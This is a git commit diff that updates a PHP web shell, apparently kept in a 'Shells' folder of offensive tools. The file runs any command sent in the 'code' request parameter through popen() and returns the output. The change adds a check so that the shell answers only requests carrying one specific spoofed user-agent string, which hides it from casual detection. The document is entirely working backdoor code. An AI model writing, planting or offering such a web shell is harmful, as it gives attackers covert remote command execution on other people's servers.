e98a4610e8522c031455720daafbcc98704a1ee1
3v4Si0N <hector.de.armas.hda@gmail.com>
2021-10-19 15:45:47 +0200

    Update shell.php

--- Shells/shell.php
+++ Shells/shell.php
@@ -1,7 +1,11 @@
 <?php
+  $useragent = $_SERVER['HTTP_USER_AGENT'];
+  if ($useragent == "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0") {
     $fp = popen($_REQUEST['code'],'r');
     while(!feof($fp)){
-        print fread($fp, 1024*4);
-        flush();}
-    fclose($fp);
+      print fread($fp, 1024*4);
+      flush();
+    }
+  }
+  fclose($fp);
 ?>
